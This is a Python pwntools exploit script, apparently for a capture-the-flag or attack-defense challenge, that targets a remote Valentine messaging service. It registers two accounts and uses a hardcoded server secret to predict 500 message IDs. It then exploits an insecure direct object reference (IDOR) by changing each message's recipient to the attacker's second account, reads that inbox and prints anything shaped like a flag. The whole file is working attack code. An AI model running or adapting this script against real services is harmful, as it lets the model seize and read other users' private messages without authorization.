#!/usr/bin/env python3

from pwn import *
import sys
import random
import string
import re
import hashlib

def randstr(n=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])

io = remote(ip, port)

user1 = randstr()
pass1 = randstr()

user2 = randstr()
pass2 = randstr()

# =========================
# Register User1
# =========================
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Username: ", user1.encode())
io.sendlineafter(b"Password: ", pass1.encode())

# =========================
# Register User2
# =========================
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Username: ", user2.encode())
io.sendlineafter(b"Password: ", pass2.encode())

# =========================
# Login User1
# =========================
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Username: ", user1.encode())
io.sendlineafter(b"Password: ", pass1.encode())

# =========================
# Try IDOR on message IDs
# =========================
server_secret = "love_is_eternal_2026"
id_count=500
pool = []
for i in range(id_count):
    data = f"{server_secret}:{i}:pool"
    digest = hashlib.sha256(data.encode()).hexdigest()
    id_val = int(digest[:8], 16) % 1_000_000 + 1
    pool.append(id_val)
for msg_id in pool:
    # Change recipient
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Valentine ID: ", str(msg_id).encode())
    io.sendlineafter(b"New recipient username: ", user2.encode())
# =========================
# Logout User1
# =========================
io.sendlineafter(b"> ", b"6")

# =========================
# Login User2
# =========================
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Username: ", user2.encode())
io.sendlineafter(b"Password: ", pass2.encode())

# =========================
# View inbox
# =========================
io.sendlineafter(b"> ", b"2")
data = io.recvall(timeout=3).decode(errors="ignore")
texts = re.findall(r'Text:\s*(.+)', data)

for t in texts:
    t = t.strip()
    if len(t) == 32:
        print("Found flags:")
        print(t)
io.close()
